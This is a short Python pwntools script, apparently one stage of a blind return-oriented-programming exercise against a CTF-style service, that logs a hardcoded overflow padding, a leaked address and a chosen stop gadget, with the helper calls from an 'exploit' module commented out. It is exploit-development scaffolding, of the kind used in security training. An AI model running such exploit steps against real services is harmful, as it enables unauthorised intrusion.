#!/usr/bin/env python3

from pwn import *
from exploit import getPadding, leakAddr, getStopGadget


def main():
    #pad = getPadding()
    pad = 40
    log.success(f'padding = {pad}')

    #addr = leakAddr(pad)
    addr = 0x4011cc
    log.success(f'leaked addr = {hex(addr)}')

    refs = [
        b'Bye!\n',
        b'Welcome to the LSE,',
        b'Hello you!\nWhat\'s your name?\n'
        ]
    #stop_gadgets = getStopGadget(pad, addr, refs[2])
    stop_gadgets = [0x401234]
    log.success(f'stop gagdets = {[hex(a) for a in stop_gadgets]}')
    stop_gadget = stop_gadgets[0]
    log.success(f'chosen stop gagdet = {hex(stop_gadget)}')


if __name__ == '__main__':
    main()
